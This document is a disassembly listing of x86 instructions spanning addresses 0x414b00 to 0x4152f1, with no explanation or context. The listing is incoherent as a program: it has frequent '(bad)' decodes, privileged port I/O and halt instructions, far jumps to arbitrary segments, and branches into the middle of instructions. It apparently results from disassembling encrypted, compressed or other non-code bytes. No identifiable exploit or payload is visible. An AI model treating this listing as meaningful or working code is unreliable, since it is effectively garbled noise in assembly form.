  414b00:	xor    eax,0x8d11ee85
  414b05:	test   al,0x7e
  414b07:	int3   
  414b08:	leave  
  414b09:	add    eax,0xf5dc98af
  414b0e:	cmp    cl,BYTE PTR [edi]
  414b10:	push   eax
  414b11:	lock push esi
  414b13:	jmp    0xf3216485
  414b18:	add    BYTE PTR [ebx-0x5d],bh
  414b1b:	mov    edx,0x53e0e32d
  414b20:	(bad)  
  414b22:	lods   eax,DWORD PTR ds:[esi]
  414b23:	aad    0xee
  414b25:	mov    DWORD PTR [esi],edx
  414b27:	mov    ah,0xae
  414b29:	sbb    bl,dl
  414b2b:	mov    edx,ebx
  414b2d:	shl    DWORD PTR [esi],0xd5
  414b30:	xchg   ebp,eax
  414b31:	lds    ecx,FWORD PTR [edx-0x3ff0334a]
  414b37:	mov    ecx,DWORD PTR [eax]
  414b39:	pop    ebp
  414b3a:	xchg   ebx,eax
  414b3b:	ins    BYTE PTR es:[edi],dx
  414b3c:	(bad)  
  414b3d:	sub    al,0x86
  414b3f:	call   0xf77c:0x483a47f4
  414b46:	test   BYTE PTR [eax+eax*1],ah
  414b49:	(bad)  
  414b4a:	fsubr  QWORD PTR [edi+eiz*1]
  414b4d:	push   ecx
  414b4e:	rcl    BYTE PTR [ecx+0x2],0x25
  414b52:	jg     0x414b84
  414b54:	es jle 0x414bc0
  414b57:	psubb  mm5,QWORD PTR [esi]
  414b5a:	fimul  WORD PTR [ecx]
  414b5c:	pop    edx
  414b5d:	pop    es
  414b5e:	popa   
  414b5f:	cmp    eax,0xa7974279
  414b64:	sub    cl,BYTE PTR [edi-0x2195eb90]
  414b6a:	xor    ecx,DWORD PTR [esi-0x32]
  414b6d:	fstp   QWORD PTR [ebx+0x6d]
  414b70:	mov    eax,ds:0xd52ae253
  414b75:	xor    al,BYTE PTR [ecx]
  414b77:	lods   al,BYTE PTR ds:[esi]
  414b78:	push   ss
  414b79:	cwde   
  414b7a:	inc    ebp
  414b7b:	xlat   BYTE PTR ds:[ebx]
  414b7c:	leave  
  414b7d:	(bad)  
  414b7e:	pop    ebx
  414b7f:	shl    BYTE PTR [eax+0x2ec4742e],cl
  414b85:	sub    al,0x9a
  414b87:	mul    BYTE PTR [ecx-0x384eefa6]
  414b8d:	loope  0x414b94
  414b8f:	fucomp st(7)
  414b91:	xor    eax,0x46d95cf1
  414b96:	mov    dh,0x14
  414b98:	pushf  
  414b99:	dec    esp
  414b9a:	mov    edi,0xeade7182
  414b9f:	call   0xd75c9cfd
  414ba4:	inc    esp
  414ba5:	xchg   esp,eax
  414ba6:	xchg   ebp,eax
  414ba7:	pop    ecx
  414ba8:	adc    BYTE PTR [esi+esi*4+0x8d7a0b2],0x2e
  414bb0:	mov    eax,0x4da3c5a8
  414bb5:	shl    ah,cl
  414bb7:	loope  0x414c2f
  414bb9:	es js  0x414b7d
  414bbc:	add    BYTE PTR [ecx],bl
  414bbe:	es jae 0x414bc2
  414bc1:	and    al,0xba
  414bc3:	xor    al,0x47
  414bc5:	and    ah,ch
  414bc7:	fwait
  414bc8:	fs push eax
  414bca:	or     DWORD PTR [edx+0x44],edi
  414bcd:	dec    esp
  414bce:	xchg   edx,eax
  414bcf:	inc    ebx
  414bd0:	mov    es,WORD PTR [esp+ebp*4]
  414bd3:	mov    eax,ds:0x23120dec
  414bd8:	addr16 gs loope 0x414ba2
  414bdc:	cmc    
  414bdd:	ret    0xf36
  414be0:	bndstx [eax],(bad)
  414be3:	rcl    DWORD PTR [ebx+edx*1-0x1fadecd3],1
  414bea:	push   cs
  414beb:	and    cl,ah
  414bed:	cmc    
  414bee:	dec    ebx
  414bef:	sbb    eax,0xbb87401f
  414bf4:	or     dh,BYTE PTR [edx-0x3bcb7f35]
  414bfa:	ss jb  0x414c1e
  414bfd:	xchg   ebx,eax
  414bfe:	sahf   
  414bff:	aad    0xa1
  414c01:	cwde   
  414c02:	push   ebp
  414c03:	std    
  414c04:	rcr    ah,0x2
  414c07:	jp     0x414c2b
  414c09:	add    al,0x39
  414c0b:	pop    esi
  414c0c:	ins    DWORD PTR es:[edi],dx
  414c0d:	inc    ebp
  414c0e:	loopne 0x414c42
  414c10:	mov    bh,0x6d
  414c12:	jg     0x414bd3
  414c14:	jmp    0xcb15d703
  414c19:	jp     0x414bdf
  414c1b:	fs pop ebp
  414c1d:	cmp    ecx,DWORD PTR [esi+0x45]
  414c20:	(bad)  
  414c22:	retf   
  414c23:	sahf   
  414c24:	leave  
  414c25:	or     ah,bh
  414c27:	push   edx
  414c28:	hlt    
  414c29:	shl    DWORD PTR [esi-0x57],0xd5
  414c2d:	clc    
  414c2e:	stos   BYTE PTR es:[edi],al
  414c2f:	dec    esp
  414c30:	xlat   BYTE PTR ds:[ebx]
  414c31:	fistp  WORD PTR [edx+0x3ed678e3]
  414c37:	push   esi
  414c38:	inc    ebx
  414c39:	ins    DWORD PTR es:[edi],dx
  414c3a:	sub    edx,eax
  414c3c:	mov    edi,0x4619d0dc
  414c41:	add    ah,BYTE PTR [edi+0x75e68b6a]
  414c47:	gs inc ecx
  414c49:	xor    dl,cl
  414c4b:	lds    esi,FWORD PTR [ecx]
  414c4d:	inc    edi
  414c4e:	pusha  
  414c4f:	and    edx,DWORD PTR [eax-0x1c6c3454]
  414c55:	mov    DWORD PTR [esi+eax*4],esi
  414c58:	xchg   ebp,eax
  414c59:	jle    0x414c53
  414c5b:	xchg   esi,eax
  414c5c:	shl    BYTE PTR [esi-0x2b],1
  414c5f:	cmp    ecx,DWORD PTR [edx+0x5e]
  414c62:	jbe    0x414cbe
  414c64:	dec    eax
  414c65:	loope  0x414cab
  414c67:	mov    ds:0x72ea19c8,eax
  414c6c:	and    bh,dl
  414c6e:	pop    ebp
  414c6f:	and    ebp,DWORD PTR [edx+0x21182b10]
  414c75:	and    al,0x9b
  414c77:	das    
  414c78:	retf   0xec91
  414c7b:	mov    edi,0xf1bcd782
  414c80:	xchg   edi,eax
  414c81:	push   0x2ded7f41
  414c86:	ret    0x88ee
  414c89:	jae    0x414c69
  414c8b:	xor    BYTE PTR [eax+esi*4-0x55],ch
  414c8f:	mov    WORD PTR [ebx-0x14347827],fs
  414c95:	pop    ebp
  414c96:	mov    bl,0xc4
  414c98:	adc    eax,0x96501c85
  414c9d:	fadd   QWORD PTR [ebp-0x3a]
  414ca0:	aaa    
  414ca1:	cs pop esp
  414ca3:	loope  0x414c8f
  414ca5:	inc    edi
  414ca6:	push   eax
  414ca7:	or     eax,0x76bad9a
  414cac:	jo     0x414c49
  414cae:	std    
  414caf:	xor    BYTE PTR [ebx-0x69437a59],0xac
  414cb6:	sbb    eax,DWORD PTR [ecx-0x1]
  414cb9:	mov    ebx,0x5545a0eb
  414cbe:	pusha  
  414cbf:	xchg   ebx,eax
  414cc0:	jle    0x414d3e
  414cc2:	inc    edi
  414cc3:	int3   
  414cc4:	jo     0x414d14
  414cc6:	mov    dh,BYTE PTR [esi+0x5e691bc9]
  414ccc:	lahf   
  414ccd:	add    edx,DWORD PTR [ecx+0x55c437cd]
  414cd3:	xor    al,0x3a
  414cd5:	push   0xffffffb4
  414cd7:	xor    ebx,eax
  414cd9:	push   0x2c
  414cdb:	or     eax,0x7ed38960
  414ce0:	retf   
  414ce1:	imul   edi,DWORD PTR [ebx-0x2c52656],0xffffffdb
  414ce8:	outs   dx,BYTE PTR ds:[esi]
  414ce9:	push   0x28b44dce
  414cee:	call   0xc9c9fcb5
  414cf3:	(bad)  
  414cf4:	js     0x414c8c
  414cf6:	push   0x3c
  414cf8:	xor    ebp,DWORD PTR [eax]
  414cfa:	add    BYTE PTR [esi+0x6],cl
  414cfd:	adc    edi,DWORD PTR [edi+0x67]
  414d00:	call   0x6dac164d
  414d05:	sub    ebx,DWORD PTR [eax+0x5f151722]
  414d0b:	jae    0x414d5b
  414d0d:	sbb    ebx,0x1b
  414d10:	cwde   
  414d11:	sbb    esp,ecx
  414d13:	mul    esi
  414d15:	(bad)  
  414d16:	(bad)  
  414d17:	popf   
  414d18:	fist   WORD PTR [ebp+ebx*1+0x10a8b8bf]
  414d1f:	jbe    0x414d61
  414d21:	fwait
  414d22:	cs cld 
  414d24:	cmp    eax,0x4355a447
  414d29:	xchg   ebp,eax
  414d2a:	pop    esp
  414d2b:	sbb    eax,0x17b1d45f
  414d30:	add    BYTE PTR [edi+0x44ca387d],ah
  414d36:	out    dx,eax
  414d37:	and    al,0x43
  414d39:	das    
  414d3a:	pminub mm4,QWORD PTR [edi]
  414d3d:	inc    ebx
  414d3e:	jge    0x414d8e
  414d40:	loop   0x414d9c
  414d42:	dec    eax
  414d43:	lds    ecx,FWORD PTR ds:0x4e78f610
  414d49:	(bad)  
  414d4a:	sbb    edx,DWORD PTR [edi-0x2e]
  414d4d:	mov    WORD PTR [eax-0x3d],ds
  414d50:	or     eax,ebx
  414d52:	js     0x414cd6
  414d54:	push   0x170bdbfe
  414d59:	aam    0xb5
  414d5b:	retf   
  414d5c:	(bad)  
  414d5d:	cmc    
  414d5e:	loope  0x414d81
  414d60:	sub    eax,0x429d78f4
  414d65:	ja     0x414d6b
  414d67:	dec    eax
  414d68:	(bad)  
  414d69:	xchg   ebx,eax
  414d6a:	push   ss
  414d6b:	ror    DWORD PTR fs:[esi-0x3d37c7f6],cl
  414d72:	xchg   ecx,eax
  414d73:	cdq    
  414d74:	jmp    0x414d26
  414d76:	hlt    
  414d77:	js     0x414db4
  414d79:	mov    ebx,0x703c7aa6
  414d7e:	mov    cl,0xba
  414d80:	mov    esi,gs
  414d82:	cmp    al,0xd7
  414d84:	dec    esi
  414d85:	sbb    esi,DWORD PTR [eax-0x53]
  414d88:	ret    0x6f52
  414d8b:	out    0xb6,eax
  414d8d:	std    
  414d8e:	call   0xae326b33
  414d93:	or     al,0x83
  414d95:	dec    ecx
  414d96:	call   0x6394:0xe7d697ce
  414d9d:	inc    edx
  414d9e:	adc    al,0x22
  414da0:	jmp    0xa4e3:0xef437709
  414da7:	psrad  mm3,QWORD PTR [eax]
  414daa:	repz icebp 
  414dac:	lahf   
  414dad:	call   0x37a4:0x5a64260d
  414db4:	xchg   edx,eax
  414db5:	or     eax,0x96d346e8
  414dba:	vmwrite eax,DWORD PTR [eax]
  414dbd:	lods   eax,DWORD PTR ds:[esi]
  414dbe:	adc    eax,0x8e8249f1
  414dc3:	pop    edi
  414dc4:	mov    ch,0xbf
  414dc6:	ror    ah,0x16
  414dc9:	sbb    BYTE PTR ds:0x306747f6,0x23
  414dd0:	or     al,0xc2
  414dd2:	jge    0x414dc3
  414dd4:	sahf   
  414dd5:	fcom   QWORD PTR [ebp-0x5f049ac9]
  414ddb:	or     DWORD PTR [edx+0x9],esp
  414dde:	call   0xf959ef9d
  414de3:	js     0x414e52
  414de5:	and    ebp,DWORD PTR [ecx-0x36ff09c2]
  414deb:	pop    edx
  414dec:	sub    al,0x5f
  414dee:	sahf   
  414def:	mov    ebp,eax
  414df1:	repnz shl esi,0xae
  414df5:	mov    esp,0xa1252699
  414dfa:	stc    
  414dfb:	sbb    BYTE PTR [eax+0x1bdae3cb],bh
  414e01:	out    dx,eax
  414e02:	cmp    ch,BYTE PTR [ecx]
  414e04:	imul   ecx,DWORD PTR [eax+0x4e12028b],0xffffffbb
  414e0b:	std    
  414e0c:	mov    al,ds:0x912f43be
  414e11:	push   es
  414e12:	sbb    al,0xd7
  414e14:	jmp    0x7217:0x5259a026
  414e1b:	adc    al,0x5
  414e1d:	push   edi
  414e1e:	cmp    BYTE PTR [ebp+0x28],bh
  414e21:	test   al,0xbb
  414e23:	jns    0x414dae
  414e25:	cli    
  414e26:	popa   
  414e27:	stos   DWORD PTR es:[edi],eax
  414e28:	sbb    eax,0x6ba497e5
  414e2d:	pushf  
  414e2e:	cmp    BYTE PTR [esi],dl
  414e30:	scas   eax,DWORD PTR es:[edi]
  414e31:	mov    bh,ch
  414e33:	imul   eax,esp,0xa484d090
  414e39:	ret    
  414e3a:	pop    esi
  414e3b:	push   ss
  414e3c:	mov    edi,DWORD PTR [ebx+eax*4+0x31]
  414e40:	out    dx,al
  414e41:	rol    DWORD PTR [ebx+eax*4],1
  414e44:	or     DWORD PTR [ebp-0xb],0x4e
  414e48:	push   ds
  414e49:	stos   BYTE PTR es:[edi],al
  414e4a:	fist   DWORD PTR [esi-0x6]
  414e4d:	sub    BYTE PTR [edi],ch
  414e4f:	icebp  
  414e50:	adc    DWORD PTR [eax+0x5de9a922],esi
  414e56:	jb     0x414df0
  414e58:	lea    ebp,[ebp-0x46fe2fca]
  414e5e:	pop    edi
  414e5f:	call   0xf9e82873
  414e64:	and    BYTE PTR [ebx-0x224699d8],al
  414e6a:	jle    0x414e63
  414e6c:	vxorpd xmm3,xmm2,xmm0
  414e70:	mov    eax,0xd4abf6ad
  414e75:	jge    0x414e81
  414e77:	jmp    0x12d43e7c
  414e7c:	(bad)  
  414e7d:	shr    BYTE PTR [edx-0x48],1
  414e80:	imul   esi,eax,0xffffffa0
  414e83:	jp     0x414edf
  414e85:	test   al,0x41
  414e87:	jge    0x414e4d
  414e89:	ins    BYTE PTR es:[edi],dx
  414e8a:	mov    dl,0xc2
  414e8c:	and    bh,cl
  414e8e:	mov    dh,0x7
  414e90:	aam    0xd7
  414e92:	adc    BYTE PTR [ebp+0x46e867e5],dh
  414e98:	arpl   WORD PTR [eax+0x4e386326],dx
  414e9e:	adc    edx,edi
  414ea0:	cwde   
  414ea1:	pusha  
  414ea2:	sahf   
  414ea3:	jmp    0x414ef1
  414ea5:	adc    al,0xa2
  414ea7:	rcl    ah,cl
  414ea9:	int    0x54
  414eab:	loope  0x414e89
  414ead:	aaa    
  414eae:	fst    QWORD PTR [edi]
  414eb0:	xor    DWORD PTR [ebx+0x8f34356],ecx
  414eb6:	and    BYTE PTR [edx+0x37],bl
  414eb9:	pop    ebp
  414eba:	pop    edx
  414ebb:	push   edx
  414ebc:	jg     0x414ef1
  414ebe:	addr16 sahf 
  414ec0:	enter  0xa67b,0xcb
  414ec4:	inc    esp
  414ec5:	add    DWORD PTR [eax-0x4f],ebx
  414ec8:	icebp  
  414ec9:	(bad)  
  414ecb:	shr    BYTE PTR [esi+0x5579ee50],0xde
  414ed2:	mov    dh,BYTE PTR [esi+edx*1+0x42991962]
  414ed9:	add    eax,0x98b4908b
  414ede:	in     al,0x7
  414ee0:	lea    ecx,[esi+0x1cfaa054]
  414ee6:	jg     0x414f32
  414ee8:	push   esp
  414ee9:	and    esi,DWORD PTR [edx]
  414eeb:	and    al,0x75
  414eed:	and    eax,0x80a553a4
  414ef2:	xchg   esp,eax
  414ef3:	fisub  DWORD PTR ds:0xd625ed6d
  414ef9:	aam    0x15
  414efb:	sub    edx,ebx
  414efd:	in     al,0x30
  414eff:	sub    eax,0xbc51d799
  414f04:	scas   al,BYTE PTR es:[edi]
  414f05:	cmp    al,0x3
  414f07:	mov    esp,0xb0df4aad
  414f0c:	or     bl,ah
  414f0e:	repnz pop edx
  414f10:	push   0x1c
  414f12:	jnp    0x414f28
  414f14:	push   ds
  414f15:	push   ds
  414f16:	jg     0x414f6d
  414f18:	xor    DWORD PTR [ecx-0x42868484],ebx
  414f1e:	cmp    ebp,DWORD PTR [ecx+edx*8-0x4b]
  414f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f23:	mov    al,ds:0x45b909a8
  414f28:	add    bh,bh
  414f2a:	inc    edx
  414f2b:	(bad)  
  414f2c:	nop
  414f2d:	dec    ebx
  414f2e:	fld    QWORD PTR [ecx]
  414f30:	retf   0xf5ed
  414f33:	xrelease mov BYTE PTR [eax-0x77],dh
  414f37:	jle    0x414f83
  414f39:	(bad)  
  414f3a:	adc    edi,ebx
  414f3c:	je     0x414ec2
  414f3e:	in     eax,0xe4
  414f40:	push   ss
  414f41:	mov    eax,ds:0xa6bfe9ad
  414f46:	dec    esp
  414f47:	pop    ds
  414f48:	in     al,0x29
  414f4a:	mov    ebx,0xae9b6ce3
  414f4f:	mov    ?,eax
  414f51:	(bad)  
  414f52:	jg     0x414f03
  414f54:	adc    DWORD PTR [esi],0x4b
  414f57:	dec    ebx
  414f58:	sub    DWORD PTR [ebp-0x5b022e4e],esp
  414f5e:	in     eax,dx
  414f5f:	inc    ecx
  414f60:	popa   
  414f61:	add    DWORD PTR [eax],edi
  414f63:	sbb    dh,BYTE PTR [esi+0x22ff7dce]
  414f69:	or     ch,al
  414f6b:	jmp    0xcc26:0x9e28162f
  414f72:	popf   
  414f73:	test   eax,0xdefcea50
  414f78:	cld    
  414f79:	lods   al,BYTE PTR ds:[esi]
  414f7a:	in     al,0xaf
  414f7c:	in     al,dx
  414f7d:	icebp  
  414f7e:	outs   dx,DWORD PTR ds:[esi]
  414f7f:	mov    al,ds:0xc9da1787
  414f84:	clc    
  414f85:	cmp    bh,BYTE PTR [ebp-0x1e]
  414f88:	add    eax,0xcb7e38fa
  414f8d:	jb     0x414f21
  414f8f:	dec    edi
  414f90:	xchg   DWORD PTR ds:0xd82e661d,edi
  414f96:	adc    DWORD PTR [ebx+ebp*1],ecx
  414f99:	rol    esp,1
  414f9b:	dec    ecx
  414f9c:	vprotq ymm5,xmm7,xmm7
  414fa1:	or     bh,0xcc
  414fa4:	ret    0x9980
  414fa7:	ds mov esi,0xc6dd82c0
  414fad:	xchg   ebx,eax
  414fae:	xor    BYTE PTR [ebx-0x7c],bl
  414fb1:	mov    ds:0xc19f2985,eax
  414fb6:	icebp  
  414fb7:	(bad)  
  414fb8:	dec    edi
  414fb9:	fadd   QWORD PTR [ebx+0x36]
  414fbc:	lods   eax,DWORD PTR ds:[esi]
  414fbd:	ds cmc 
  414fbf:	adc    BYTE PTR ds:0xd3c4b013,bl
  414fc5:	sti    
  414fc6:	mov    eax,ds:0xbc92d200
  414fcb:	imul   ecx,DWORD PTR [ecx-0x245366f2],0x3b
  414fd2:	mov    al,0x40
  414fd4:	sbb    DWORD PTR [ebp-0x6d0864c4],ebp
  414fda:	mov    ah,0xda
  414fdc:	leave  
  414fdd:	or     eax,0xefeeea7c
  414fe2:	sbb    eax,ebx
  414fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe5:	or     al,0xc4
  414fe7:	imul   DWORD PTR [ecx]
  414fe9:	jp     0x414fc2
  414feb:	pop    esp
  414fec:	fstp   DWORD PTR [ebp+0x6f]
  414fef:	repnz ins DWORD PTR es:[edi],dx
  414ff1:	mov    al,ds:0xa54cd423
  414ff6:	jae    0x41506c
  414ff8:	sbb    eax,0xadff1a43
  414ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ffe:	cmp    edi,DWORD PTR [edi]
  415000:	jle    0x415009
  415002:	cmp    edi,DWORD PTR [ecx]
  415004:	inc    ebp
  415005:	dec    ebp
  415006:	inc    esi
  415007:	jge    0x415042
  415009:	jmp    0x41502c
  41500b:	fdivp  st(3),st
  41500d:	in     eax,dx
  41500e:	scas   eax,DWORD PTR es:[edi]
  41500f:	or     esi,esi
  415011:	mov    esp,0x788620d0
  415016:	ret    0x8f2a
  415019:	cli    
  41501a:	xchg   ecx,eax
  41501b:	dec    ebx
  41501c:	je     0x414fbd
  41501e:	ret    0xc32b
  415021:	adc    ch,dl
  415023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415024:	mov    al,ds:0x32474aa
  415029:	jno    0x415043
  41502b:	cmp    eax,0xefee2a95
  415030:	daa    
  415031:	dec    ecx
  415032:	aam    0x97
  415034:	and    DWORD PTR [esi],edx
  415036:	js     0x414ff9
  415038:	xchg   BYTE PTR [edx-0x28],bl
  41503b:	add    al,0xf5
  41503d:	popa   
  41503e:	jmp    0x51a6:0x20d85fd9
  415045:	mov    ebp,0xd4474c8a
  41504a:	loopne 0x4150c7
  41504c:	dec    ebx
  41504d:	mov    ds:0x34ccb10d,al
  415052:	adc    dh,BYTE PTR [eax-0x7d290a8]
  415058:	loopne 0x415039
  41505a:	dec    edi
  41505b:	sahf   
  41505c:	or     DWORD PTR [ebx-0x2b],ecx
  41505f:	push   edi
  415060:	je     0x414fe4
  415062:	mov    edi,0xaf551ce9
  415067:	jmp    0x415089
  415069:	nop
  41506a:	lods   al,BYTE PTR ds:[esi]
  41506b:	nop
  41506c:	inc    eax
  41506d:	mov    edi,0xa050aea7
  415072:	sub    edx,esi
  415074:	mov    edi,0x7d976585
  415079:	push   ds
  41507a:	xchg   ecx,eax
  41507b:	bound  ebp,QWORD PTR [edx+0x52f96ac3]
  415081:	inc    esp
  415082:	adc    edi,DWORD PTR [ebx+0x76]
  415085:	add    dh,BYTE PTR [ebp-0x631bd066]
  41508b:	shl    ebp,0x0
  41508e:	ror    ecx,0x37
  415091:	rcl    dh,0x70
  415094:	aaa    
  415095:	in     al,dx
  415096:	mov    dl,0x51
  415098:	test   DWORD PTR [esi],esp
  41509a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41509b:	push   eax
  41509c:	das    
  41509d:	dec    ebp
  41509e:	add    dl,BYTE PTR [ebp+0x16a973f6]
  4150a4:	sti    
  4150a5:	xor    eax,0x8acbdccd
  4150aa:	xor    al,0xbe
  4150ac:	push   ebx
  4150ad:	std    
  4150ae:	mov    eax,0x59e570d5
  4150b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150b4:	sbb    dl,bl
  4150b6:	mov    edx,0xc0d74cd
  4150bb:	inc    esp
  4150bc:	and    al,0x2c
  4150be:	sub    ebx,DWORD PTR [eax+ecx*8-0x39a903d5]
  4150c5:	mov    esi,?
  4150c7:	xor    BYTE PTR [esi],al
  4150c9:	or     BYTE PTR [esi],cl
  4150cb:	or     al,0xae
  4150cd:	fimul  WORD PTR ds:0xa4c67031
  4150d3:	in     al,dx
  4150d4:	popf   
  4150d5:	clc    
  4150d6:	arpl   WORD PTR ss:[edx-0x17],di
  4150da:	mov    es,WORD PTR [ebx+0x176588be]
  4150e0:	ror    bh,cl
  4150e2:	scas   eax,DWORD PTR es:[edi]
  4150e3:	not    DWORD PTR [eax]
  4150e5:	sbb    eax,0x81758872
  4150ea:	mov    dl,0xd2
  4150ec:	push   esi
  4150ed:	push   es
  4150ee:	mov    al,0xaa
  4150f0:	add    DWORD PTR [eax],ecx
  4150f2:	aad    0x94
  4150f4:	inc    eax
  4150f5:	les    eax,FWORD PTR [edi+edi*4+0x1]
  4150f9:	mov    esi,0x4648e7e4
  4150fe:	jmp    0x28dc:0x2804ebf9
  415105:	pop    ds
  415106:	push   ecx
  415107:	or     cl,BYTE PTR [eax-0x7]
  41510a:	inc    ebp
  41510b:	lock cwde 
  41510d:	outs   dx,DWORD PTR ds:[esi]
  41510e:	test   DWORD PTR [esi],ebx
  415110:	cmp    BYTE PTR [ecx+edx*2+0x28358315],0x8b
  415118:	dec    edi
  415119:	dec    esi
  41511a:	test   DWORD PTR [eax-0x7d902014],edx
  415120:	test   dl,dl
  415122:	xor    BYTE PTR [esi],ch
  415124:	jcxz   0x415155
  415127:	mov    dh,0xa4
  415129:	jmp    DWORD PTR [ebx]
  41512b:	cdq    
  41512c:	push   es
  41512d:	jg     0x415139
  41512f:	(bad)
  415133:	cmp    ebx,edx
  415135:	jle    0x4150d5
  415137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415138:	sbb    al,0xdc
  41513a:	add    al,0x7d
  41513c:	test   eax,0x7daef7fd
  415141:	mov    eax,ds:0xb876c730
  415146:	scas   eax,DWORD PTR es:[edi]
  415147:	fcomp  st(0)
  415149:	sub    BYTE PTR ds:0x4c1ef2bb,0xa
  415150:	and    bh,BYTE PTR [eax+0x3e4d640d]
  415156:	out    0xcb,eax
  415158:	das    
  415159:	shl    DWORD PTR [edx+0x29],1
  41515c:	mov    eax,ds:0x3f8cf3cc
  415161:	sti    
  415162:	pop    ebx
  415163:	cmp    DWORD PTR ds:0x9e9cb6ef,ebx
  415169:	test   BYTE PTR [ebp+0x27],bl
  41516c:	sahf   
  41516d:	ja     0x415131
  41516f:	dec    ecx
  415170:	jae    0x41517b
  415172:	pop    ss
  415173:	ficomp DWORD PTR [edx-0x71d102e7]
  415179:	or     eax,0xf7f65938
  41517e:	ret    
  41517f:	sub    eax,0x3bcbcf91
  415184:	pop    ebp
  415185:	xlat   BYTE PTR ds:[ebx]
  415186:	fisub  WORD PTR [edx+0x3f]
  415189:	aad    0x5
  41518b:	in     al,0x23
  41518d:	cmp    eax,0xe21933bf
  415192:	sub    edx,DWORD PTR [ebx]
  415194:	dec    edx
  415195:	sbb    DWORD PTR [edx],esp
  415197:	sub    ebp,eax
  415199:	push   0x63ac928d
  41519e:	fimul  DWORD PTR [ebp-0x57]
  4151a1:	xchg   edi,eax
  4151a2:	mov    ecx,0xb85947c2
  4151a7:	mov    DWORD PTR [ebx+eax*8],esi
  4151aa:	test   BYTE PTR [eax+0x5f],al
  4151ad:	pop    edi
  4151ae:	fiadd  WORD PTR [edx+esi*2+0x66]
  4151b2:	sub    eax,0xb4b69c82
  4151b7:	dec    eax
  4151b8:	pop    ds
  4151b9:	adc    DWORD PTR [edx],ecx
  4151bb:	mov    esi,0x907cf8c6
  4151c0:	pop    ds
  4151c1:	fadd   st,st(7)
  4151c3:	jnp    0x415230
  4151c5:	jg     0x415237
  4151c7:	and    BYTE PTR [edi],ah
  4151c9:	outs   dx,BYTE PTR ds:[esi]
  4151ca:	retf   0x5fd
  4151cd:	shr    cl,1
  4151cf:	dec    esi
  4151d0:	lahf   
  4151d1:	mov    ch,0x53
  4151d3:	push   ss
  4151d4:	arpl   sp,si
  4151d6:	or     eax,0xa7e1aa6
  4151db:	or     DWORD PTR [edi],edx
  4151dd:	adc    bh,bl
  4151df:	or     al,0x85
  4151e1:	inc    esi
  4151e2:	in     al,0x44
  4151e4:	call   0xc074:0x91cc02d7
  4151eb:	outs   dx,DWORD PTR ds:[esi]
  4151ec:	sub    BYTE PTR [ebp+esi*4+0x63],al
  4151f0:	mov    edx,0x7376ed83
  4151f5:	nop
  4151f6:	xchg   ebx,eax
  4151f7:	push   edx
  4151f8:	fcom   QWORD PTR [ebp+ebx*8-0x2d]
  4151fc:	retf   0x92cb
  4151ff:	ins    BYTE PTR es:[edi],dx
  415200:	xchg   esp,eax
  415201:	mov    al,0xdb
  415203:	mov    dl,0x5
  415205:	or     DWORD PTR [eax-0x26],0x78
  415209:	inc    eax
  41520a:	pop    edx
  41520b:	mov    bh,0xb9
  41520d:	test   al,0x4d
  41520f:	(bad)  
  415211:	push   es
  415212:	nop
  415213:	push   ss
  415214:	mov    dl,0xb8
  415216:	pop    ss
  415217:	aam    0x2c
  415219:	add    WORD PTR [ebx+0x656dc695],sp
  415220:	pop    esi
  415221:	cmp    eax,0x48d0c544
  415226:	jb     0x41529b
  415228:	fs ja  0x415279
  41522b:	sub    bl,ch
  41522d:	aaa    
  41522e:	jbe    0x41528c
  415230:	push   esi
  415231:	pop    eax
  415232:	or     al,BYTE PTR [ebp+eiz*1-0x4a]
  415236:	shl    BYTE PTR [esi],cl
  415238:	retf   
  415239:	xor    eax,DWORD PTR [edi]
  41523b:	xchg   ecx,eax
  41523c:	xchg   ecx,eax
  41523d:	xor    bl,bl
  41523f:	repz mov sp,0xd7fd
  415244:	outs   dx,BYTE PTR ds:[esi]
  415245:	cld    
  415246:	stc    
  415247:	cmp    eax,0xe14158e5
  41524c:	xchg   esp,eax
  41524d:	mov    ds:0x73007204,eax
  415252:	sub    ch,BYTE PTR [edx-0x9]
  415255:	mov    esi,DWORD PTR [ebp-0x7822ae4d]
  41525b:	xor    al,BYTE PTR [ebx]
  41525d:	frstor [ebp+0x72]
  415260:	xchg   esp,eax
  415261:	mov    esp,0x3a652d06
  415266:	push   ebp
  415267:	neg    DWORD PTR [edi]
  415269:	std    
  41526a:	iret   
  41526b:	stos   BYTE PTR es:[edi],al
  41526c:	push   ecx
  41526d:	cld    
  41526e:	push   es
  41526f:	(bad)  
  415270:	jmp    0x4152e3
  415272:	add    bh,bl
  415274:	sbb    ebx,DWORD PTR [edi]
  415276:	add    BYTE PTR [edi-0x26],bl
  415279:	mov    WORD PTR [edx+edi*4+0x31],cs
  41527d:	push   ds
  41527e:	xor    BYTE PTR [eax],ch
  415280:	lock add ch,dl
  415283:	into   
  415284:	fcmovnu st,st(6)
  415286:	inc    ebp
  415287:	les    edi,FWORD PTR [edi]
  415289:	mov    al,ds:0x12b300ad
  41528e:	ins    DWORD PTR es:[edi],dx
  41528f:	pop    ebp
  415290:	sar    BYTE PTR ds:0xda4f4a5b,cl
  415296:	adc    eax,0x3ed418a7
  41529b:	mov    bl,0x89
  41529d:	sbb    al,0xf2
  41529f:	push   0x489499b9
  4152a4:	adc    al,0x7c
  4152a6:	pushf  
  4152a7:	(bad)  
  4152a8:	jbe    0x415286
  4152aa:	xor    eax,esp
  4152ac:	fistp  DWORD PTR [eax-0xa]
  4152af:	jns    0x41532e
  4152b1:	inc    ebx
  4152b2:	stc    
  4152b3:	mov    ch,0xfa
  4152b5:	pop    edx
  4152b6:	idiv   BYTE PTR [esi+esi*1]
  4152b9:	mov    fs,WORD PTR [edi-0x28]
  4152bc:	sub    ch,bl
  4152be:	sub    BYTE PTR [eax-0x71f83314],cl
  4152c4:	mov    bl,0x26
  4152c6:	hlt    
  4152c7:	jmp    0xbfc5:0x63c57734
  4152ce:	rol    BYTE PTR [ebp+0x78a5e944],1
  4152d4:	cli    
  4152d5:	test   al,0x62
  4152d7:	icebp  
  4152d8:	add    dh,bh
  4152da:	(bad)  
  4152db:	repnz cmp eax,0x28248a79
  4152e1:	fmul   DWORD PTR [eax]
  4152e3:	retf   0xeb69
  4152e6:	or     eax,0x2c675918
  4152eb:	push   es
  4152ec:	mov    esi,edx
  4152ee:	(bad)  
  4152ef:	out    0xed,al
  4152f1:	sub    ah,dh
